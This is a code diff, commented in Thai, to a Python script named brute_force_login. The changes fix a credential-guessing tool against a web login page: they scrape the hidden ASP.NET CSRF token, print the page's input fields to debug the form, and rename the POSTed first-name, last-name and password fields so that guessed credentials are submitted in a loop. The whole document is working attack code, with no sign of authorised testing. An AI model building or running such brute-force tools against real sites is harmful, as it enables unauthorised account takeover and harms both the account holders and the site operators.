@@ -63,12 +63,23 @@ def brute_force_login():
     # 4. โหลดหน้า login เพื่อนำ CSRF Token
     try:
         response = session.get(login_url)
+        print(response.text)  # <<<<< เพิ่มบรรทัดนี้
         soup = BeautifulSoup(response.text, 'html.parser')
         
-        # 5. ดึง CSRF Token จาก input hidden
+        # 5. ดึง CSRF Token จาก input hidden (ตาม test.py)
         csrf_input = soup.find('input', {'name': '__RequestVerificationToken'})
         if not csrf_input:
             print("❌ ไม่พบ CSRF Token ในหน้า login")
+            print("🔍 กำลังตรวจสอบ HTML structure...")
+            
+            # แสดง input fields ทั้งหมดเพื่อ debug
+            all_inputs = soup.find_all('input')
+            print(f"พบ input fields จำนวน: {len(all_inputs)}")
+            for i, input_field in enumerate(all_inputs, 1):
+                input_name = input_field.get('name', 'ไม่มีชื่อ')
+                input_type = input_field.get('type', 'text')
+                print(f"   {i}. Name: {input_name}, Type: {input_type}")
+            
             return
             
         csrf_token = csrf_input['value']
@@ -100,9 +111,9 @@ def brute_force_login():
                 # เตรียมข้อมูลสำหรับ POST
                 login_data = {
                     '__RequestVerificationToken': csrf_token,
-                    'FName': fname,     
-                    'LName': lname,      
-                    'Password': password 
+                    'fname': fname,     # ใช้ตัวพิมพ์เล็กตาม test.py
+                    'lname': lname,      # ใช้ตัวพิมพ์เล็กตาม test.py
+                    'password': password # ใช้ตัวพิมพ์เล็กตาม test.py
                 }
                 
                 print(f"🔍 ทดสอบครั้งที่ {attempt_count}: {fname} {lname} / {password}")
